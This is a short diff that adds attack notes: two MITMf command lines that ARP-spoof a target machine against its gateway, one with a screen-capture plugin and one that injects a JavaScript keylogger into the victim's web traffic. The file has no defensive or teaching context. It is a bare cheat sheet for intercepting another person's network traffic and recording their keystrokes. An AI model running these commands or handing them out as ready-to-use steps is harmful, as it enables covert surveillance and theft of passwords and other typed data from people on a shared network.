@@ -1,0 +1,7 @@
+//Using MITMF plugins
+
+mitmf --arp --spoof --gateway (ROUTERIP) --targets (TARGETSIP) -i (INTERFACE) --screen
+
+//Keylogger
+
+mitmf --arp --spoof --gateway (ROUTERIP) --targets (TARGETSIP) -i (INTERFACE) --jskeylogger
